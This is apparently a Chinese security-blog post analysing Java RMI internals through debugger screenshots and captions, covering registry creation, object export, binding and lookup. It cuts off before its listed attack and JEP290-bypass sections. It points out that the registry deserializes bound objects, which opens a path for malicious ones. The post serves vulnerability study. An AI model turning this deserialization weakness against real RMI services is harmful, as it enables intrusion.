        <li><a class="icon" aria-label="Previous post" href="/blog/2023/12/24/0x0B%20JNDI%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/blog/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=RMI漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=RMI漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI漏洞分析&body=Check out this article: https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=RMI漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=RMI漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%9B%BE%E8%83%9C%E5%8D%83%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">一图胜千言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">2.2.</span> <span class="toc-text">服务端创建注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.3.</span> <span class="toc-text">服务端创建远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%BB%91%E5%AE%9A%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">2.4.</span> <span class="toc-text">服务端远程对象绑定注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%8E%A5%E5%8F%97%E5%B9%B6%E5%A4%84%E7%90%86%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%91%E5%AE%9A%E8%AF%B7%E6%B1%82"><span class="toc-number">2.5.</span> <span class="toc-text">注册中心接受并处理服务端绑定请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.6.</span> <span class="toc-text">客户端获取注册中心代理对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A3%E7%90%86%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.7.</span> <span class="toc-text">客户端通过注册中心代理查找远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%B6%E5%88%B0%E6%9F%A5%E8%AF%A2%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%BF%94%E5%9B%9E%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BB%A3%E7%90%86"><span class="toc-number">2.8.</span> <span class="toc-text">注册中心收到查询请求并返回远程对象的代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B0%83%E7%94%A8%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95%E5%B9%B6%E8%8E%B7%E5%8F%96%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C"><span class="toc-number">2.9.</span> <span class="toc-text">客户端调用远程对象的方法并获取返回结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E6%94%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">2.10.</span> <span class="toc-text">服务端接收调用函数请求并返回执行结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">3.</span> <span class="toc-text">RMI的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">客户端攻击服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">3.2.</span> <span class="toc-text">服务端攻击客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">3.3.</span> <span class="toc-text">客户端攻击注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">3.4.</span> <span class="toc-text">服务端攻击注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7-%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.5.</span> <span class="toc-text">注册中心攻击客户&#x2F;服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.6.</span> <span class="toc-text">动态类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBClient%E7%AB%AF"><span class="toc-number">3.6.1.</span> <span class="toc-text">攻击Client端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBServer%E7%AB%AF"><span class="toc-number">3.6.2.</span> <span class="toc-text">攻击Server端</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JEP290-%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">JEP290 绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        RMI漏洞分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Jasper_sec</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-24T02:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
        
        (Updated: <time datetime="2023-12-24T13:52:16.857Z" class="dt-updated" itemprop="dateModified">2023-12-24</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/blog/tags/Java-RMI/" rel="tag">Java RMI</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时间有限，目前只跟完了RMI的源码分析部分，攻击和绕过只有下周再来了。<br>不过跟源码也已经发现了一些有意思的反序列化点，也算是为后面学习打基础了。</p>
<p>更新：RMI的攻击分析也差不多结束了，还差JEP290的绕过不太想看，我要去修手机了。</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>看了一些师傅的文章，发现RMI交互这块内容写得都异常混乱，大篇幅的文字，很容易看得云里雾里。<br>这里我按照下图标号的顺序，依次调试每一块代码，并对代码进行标注，希望能对师傅们有所帮助。</p>
<p>推荐先看完组长的视频，自己跟着调一遍，此时可能会感觉云里雾里、不知所云，这是正常的；<br>接着再看素十八师傅的博客，主要是源码分析这一块，再调试一遍，基本就能掌握了。</p>
<h2 id="一图胜千言"><a href="#一图胜千言" class="headerlink" title="一图胜千言"></a>一图胜千言</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694537254610-7d9b9003-0690-4413-af92-762888b064e9.png#averageHue=%23a8a6a6&clientId=uc8e5803f-9cef-4&from=ui&id=SNXRq&originHeight=605&originWidth=1289&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256954&status=done&style=none&taskId=u6dddc8cb-3c15-4a27-a917-27ceb095848&title=" alt="1.png"></p>
<h2 id="服务端创建注册中心"><a href="#服务端创建注册中心" class="headerlink" title="服务端创建注册中心"></a>服务端创建注册中心</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694501455982-dc009e40-9c77-4969-b2d4-c737cf3d4226.png#averageHue=%2313181f&clientId=uf0282921-bd1e-4&from=paste&height=458&id=LAgop&originHeight=573&originWidth=1415&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=113649&status=done&style=none&taskId=ufb5d791d-f0a6-473f-84c0-72d32531ec5&title=&width=1132" alt="image.png"><br>创建RegistryImpl对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694501608137-fb1d05ad-0f5c-4788-9456-2cd461075787.png#averageHue=%230e1930&clientId=uf0282921-bd1e-4&from=paste&height=123&id=ST4J1&originHeight=154&originWidth=1393&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31991&status=done&style=none&taskId=u118b3195-b43d-4ae6-a277-e37cbece800&title=&width=1114.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694501774073-c020cd1f-4087-4df8-826a-24e958679c52.png#averageHue=%2313151a&clientId=uf0282921-bd1e-4&from=paste&height=741&id=TY6k2&originHeight=926&originWidth=1968&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236009&status=done&style=none&taskId=u1df771b3-54e2-4572-a8db-2fcca534896&title=&width=1574.4" alt="image.png"><br>setup#UnicastServerRef#exportObject暴露RegistryImpl对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694502215812-7c05094e-a70f-481a-89c8-754b9c8f6d34.png#averageHue=%23131820&clientId=uf0282921-bd1e-4&from=paste&height=330&id=Yt5md&originHeight=413&originWidth=1870&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72940&status=done&style=none&taskId=u0829d444-2d4a-406a-b6d5-7589b910b85&title=&width=1496" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694502648423-9f095b22-c4ca-42bc-bbdf-df3948f228de.png#averageHue=%23121419&clientId=uf0282921-bd1e-4&from=paste&height=799&id=AUunb&originHeight=999&originWidth=2255&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=315549&status=done&style=none&taskId=u3c35aecb-3ac4-4548-bdde-bc6240fb68f&title=&width=1804" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png#averageHue=%2311111e&clientId=uf0282921-bd1e-4&from=paste&height=241&id=mmmZH&originHeight=301&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43469&status=done&style=none&taskId=u1771d79b-f776-4b8e-8f1c-901bfa7c17b&title=&width=1071.2" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png#averageHue=%2311111d&clientId=uf0282921-bd1e-4&from=paste&height=236&id=rh2Em&originHeight=295&originWidth=1338&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46553&status=done&style=none&taskId=ub737a8ac-096a-44a5-999f-64d6b1ddc94&title=&width=1070.4" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503553792-9a8aedda-1347-4b78-8a1b-a6059a2e06da.png#averageHue=%23131418&clientId=uf0282921-bd1e-4&from=paste&height=1006&id=kDYlv&originHeight=1258&originWidth=2108&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209493&status=done&style=none&taskId=u99553c92-d4ad-4205-b9a9-08a45f1eb61&title=&width=1686.4" alt="image.png"><br>最后，把封装了RegiseryImpl_Stub的Target记录进hashtable里，至此注册中心创建完成。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503721620-8e1dad87-9e26-42da-9d2b-2a4850958d87.png#averageHue=%23104688&clientId=uf0282921-bd1e-4&from=paste&height=234&id=iVLMU&originHeight=292&originWidth=1225&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55669&status=done&style=none&taskId=u079cbc24-39f8-4634-8b9c-1602aa822d2&title=&width=980" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503776730-95951cf1-8a9c-43d9-b03a-c54e470356c2.png#averageHue=%23121419&clientId=uf0282921-bd1e-4&from=paste&height=1110&id=kyGX4&originHeight=1388&originWidth=2052&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=317877&status=done&style=none&taskId=u803405c9-8631-4fdb-962a-5821ffa856f&title=&width=1641.6" alt="image.png"></p>
<h2 id="服务端创建远程对象"><a href="#服务端创建远程对象" class="headerlink" title="服务端创建远程对象"></a>服务端创建远程对象</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694504219799-4db0ee3c-f869-403c-9c29-73676c98fbe2.png#averageHue=%2313141e&clientId=uf0282921-bd1e-4&from=paste&height=478&id=OOsp3&originHeight=598&originWidth=2025&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123542&status=done&style=none&taskId=ub731ac56-a870-469b-94b2-7c1db59e402&title=&width=1620" alt="image.png"><br>创建RemoteObjectImpl对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508220650-d9d0d666-14c8-4738-ad9d-adb5e569a0f0.png#averageHue=%2310182c&clientId=uf0282921-bd1e-4&from=paste&height=210&id=FyHem&originHeight=263&originWidth=1049&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35272&status=done&style=none&taskId=uc8373b10-6cc7-40d4-9712-6c103c1bc39&title=&width=839.2" alt="image.png"><br>调用父类UnicastRemoteObject构造函数，二层套娃。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508263787-dda626b0-bd59-4dd3-8b86-0d34e76e9643.png#averageHue=%2312171f&clientId=uf0282921-bd1e-4&from=paste&height=301&id=Uxzix&originHeight=376&originWidth=1292&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55354&status=done&style=none&taskId=u1715712f-4a0f-4a67-8b20-36553e13bcd&title=&width=1033.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508377611-0b70f624-35f8-42a6-9451-b4c843df3edf.png#averageHue=%23111926&clientId=uf0282921-bd1e-4&from=paste&height=274&id=yGGZh&originHeight=343&originWidth=2101&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59249&status=done&style=none&taskId=u692f3b2a-03c4-47fa-96d2-eabb7c08760&title=&width=1680.8" alt="image.png"><br>UnicastRemoteObject#exportObject暴露RemoteObjectImpl对象，二重套娃。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508571800-09a055b0-10c6-4c7f-9f86-6e21015538b5.png#averageHue=%23121420&clientId=uf0282921-bd1e-4&from=paste&height=356&id=GBLaT&originHeight=445&originWidth=2261&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=107798&status=done&style=none&taskId=u559d5c8c-9593-437e-9565-c88ba5ae809&title=&width=1808.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508730306-c787faec-ee5a-4dcf-8f69-7645f534f0f5.png#averageHue=%2313181f&clientId=uf0282921-bd1e-4&from=paste&height=460&id=PCatG&originHeight=575&originWidth=2097&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130834&status=done&style=none&taskId=udeb346df-771b-4879-bb53-14493783317&title=&width=1677.6" alt="image.png"><br>UnicastServerRef#exportObject暴露RemoteObjectImpl对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694508991975-e1656129-5383-422e-b55d-04f4b1eb9621.png#averageHue=%2312141d&clientId=uf0282921-bd1e-4&from=paste&height=869&id=FRxOc&originHeight=1086&originWidth=2289&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=260895&status=done&style=none&taskId=uba15130f-ebab-4909-b48b-ccaa7b96a8b&title=&width=1831.2" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png#averageHue=%2311111e&clientId=uf0282921-bd1e-4&from=paste&height=241&id=rLX0b&originHeight=301&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43469&status=done&style=none&taskId=u1771d79b-f776-4b8e-8f1c-901bfa7c17b&title=&width=1071.2" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png#averageHue=%2311111d&clientId=uf0282921-bd1e-4&from=paste&height=236&id=zlMGG&originHeight=295&originWidth=1338&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46553&status=done&style=none&taskId=ub737a8ac-096a-44a5-999f-64d6b1ddc94&title=&width=1070.4" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694509237414-3a9b728d-b30b-41dc-8ce8-43400618473a.png#averageHue=%23131519&clientId=uf0282921-bd1e-4&from=paste&height=1106&id=Zvfnj&originHeight=1383&originWidth=2073&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=247433&status=done&style=none&taskId=u665d8b60-eb88-4e85-a6e3-be0e1efcd89&title=&width=1658.4" alt="image.png"><br>最后，把封装了RemoteObjectImpl_Stub的Target记录进hashtable里，至此远程对象创建完成。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694509401415-a4186191-0a1f-4373-9800-87e597f5cfce.png#averageHue=%23121924&clientId=uf0282921-bd1e-4&from=paste&height=291&id=Nqc6k&originHeight=364&originWidth=2035&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77882&status=done&style=none&taskId=u2008e2c5-8d29-4d59-aeec-883ff90d1ff&title=&width=1628" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694509461059-c2a68346-2817-435e-af0a-c5e5a12c6c3b.png#averageHue=%2313151a&clientId=uf0282921-bd1e-4&from=paste&height=933&id=kvQRh&originHeight=1166&originWidth=2081&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=292062&status=done&style=none&taskId=u396df45a-7aed-42ae-b082-c52a8d058b1&title=&width=1664.8" alt="image.png"></p>
<h2 id="服务端远程对象绑定注册中心"><a href="#服务端远程对象绑定注册中心" class="headerlink" title="服务端远程对象绑定注册中心"></a>服务端远程对象绑定注册中心</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694509897011-29ed231d-9c69-4412-9835-c39c597ef638.png#averageHue=%2313171e&clientId=uf0282921-bd1e-4&from=paste&height=365&id=nzunw&originHeight=456&originWidth=1288&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76958&status=done&style=none&taskId=u898fff5c-4db8-4cf5-be5a-78966719140&title=&width=1030.4" alt="image.png"><br>调用RegistryImpl_Stub#bind()绑定远程对象与名称，将name和对应obj存入bindings，绑定过程到此结束。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694510186510-88f32b48-b162-4c13-ac5c-7dbe5d4d1a49.png#averageHue=%2312131b&clientId=uf0282921-bd1e-4&from=paste&height=619&id=dljik&originHeight=774&originWidth=1967&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174130&status=done&style=none&taskId=u892aa399-7039-4706-a4e6-cc2b9e8f2cf&title=&width=1573.6" alt="image.png"></p>
<h2 id="注册中心接受并处理服务端绑定请求"><a href="#注册中心接受并处理服务端绑定请求" class="headerlink" title="注册中心接受并处理服务端绑定请求"></a>注册中心接受并处理服务端绑定请求</h2><p>注册中心通过TCPTransport#handleMessages处理服务端发过来的绑定相关的请求。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694856852769-5f5ffc9d-d674-45a8-aa63-d456f5058647.png#averageHue=%23131519&clientId=ueff18163-e590-4&from=paste&height=658&id=gG41T&originHeight=823&originWidth=1792&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143984&status=done&style=none&taskId=u923121da-a54c-44f5-a74a-1e3c596e492&title=&width=1433.6" alt="image.png"><br>由于是注册中心代理对象，套娃调oldDispatch处理分发请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694856970027-81ca45aa-aaef-455f-8fb4-bc4be0d6c5b4.png#averageHue=%2313151a&clientId=ueff18163-e590-4&from=paste&height=525&id=VKu9Z&originHeight=656&originWidth=1797&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140138&status=done&style=none&taskId=u34ae2264-c31b-40be-86fa-460236f40fb&title=&width=1437.6" alt="image.png"><br>再套娃调用RegistryImpl_Skel#dispatch方法，这个方法真正处理服务端发过来的绑定请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694857036043-13f9a5e4-554c-4714-8869-c0b04f5fe83b.png#averageHue=%23131519&clientId=ueff18163-e590-4&from=paste&height=640&id=OYCV3&originHeight=800&originWidth=1802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147541&status=done&style=none&taskId=uc8e35546-f0ea-4d65-9203-cecd9957406&title=&width=1441.6" alt="image.png"><br>反序例化服务端传过来的bind(name, remote)里的name和remote，这里如果传恶意remote对象则存在漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694857338012-b42469ce-467e-4ddf-a2be-15de8f100a0b.png#averageHue=%2311131f&clientId=ueff18163-e590-4&from=paste&height=705&id=gQLvF&originHeight=881&originWidth=1810&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208831&status=done&style=none&taskId=u566521e6-09a7-43ab-94f7-e9ffede6a60&title=&width=1448" alt="image.png"></p>
<h2 id="客户端获取注册中心代理对象"><a href="#客户端获取注册中心代理对象" class="headerlink" title="客户端获取注册中心代理对象"></a>客户端获取注册中心代理对象</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694517251764-3531168c-35f7-4ddf-9b26-7b5f3a66f743.png#averageHue=%2313171e&clientId=u62ad23c8-79b1-4&from=paste&height=355&id=SIDIV&originHeight=710&originWidth=2062&originalType=binary&ratio=2&rotation=0&showTitle=false&size=128800&status=done&style=none&taskId=u249729a5-e890-4949-8570-f13b30970a1&title=&width=1031" alt="image.png"><br>套娃一层getRegistry，函数重载<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694517778630-e9830bad-4d9a-4fc5-b253-a346409ed703.png#averageHue=%230f162d&clientId=u62ad23c8-79b1-4&from=paste&height=203&id=utq8A&originHeight=406&originWidth=2079&originalType=binary&ratio=2&rotation=0&showTitle=false&size=71110&status=done&style=none&taskId=u0862afac-971c-46ec-be79-26ad84aa406&title=&width=1039.5" alt="image.png"><br>根据host&#x2F;ip封装LiveRef和UnicastRef<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694518167318-840e537b-98be-4220-8664-2ba22adb1a76.png#averageHue=%2313161d&clientId=u62ad23c8-79b1-4&from=paste&height=691&id=Yletg&originHeight=1382&originWidth=2128&originalType=binary&ratio=2&rotation=0&showTitle=false&size=342089&status=done&style=none&taskId=u85575e29-a05e-40eb-9f8e-5a65d21dc8f&title=&width=1064" alt="image.png"><br>通过Ref和RegistryImpl来创建注册中心的代理对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694518366441-fb088583-8cf0-4b25-9c20-7d84eb5bd835.png#averageHue=%2313151b&clientId=u62ad23c8-79b1-4&from=paste&height=720&id=skPnN&originHeight=1439&originWidth=2177&originalType=binary&ratio=2&rotation=0&showTitle=false&size=351651&status=done&style=none&taskId=u40e0a254-06ce-4e24-95e4-c1c08a58efd&title=&width=1088.5" 